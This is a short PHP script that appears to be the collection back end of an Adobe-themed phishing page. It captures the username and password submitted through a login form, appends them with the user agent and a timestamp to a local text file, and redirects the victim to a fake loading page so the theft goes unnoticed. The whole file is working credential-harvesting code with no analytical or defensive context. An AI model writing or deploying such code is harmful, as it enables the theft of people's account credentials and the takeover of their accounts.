<?php

$useragent = $_SERVER['HTTP_USER_AGENT'];
$server = date("D/M/d, Y g:i a"); 

file_put_contents("usernames.txt", 
"Adobe Username: " . $_POST['username'] . "
Adobe Password: " . $_POST['password'] . "
User Agent   : ".$useragent. "
Date & Time  : ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."
====================[END]==================== \n", FILE_APPEND);
header('Location: ../new/loading.html');
exit();
?>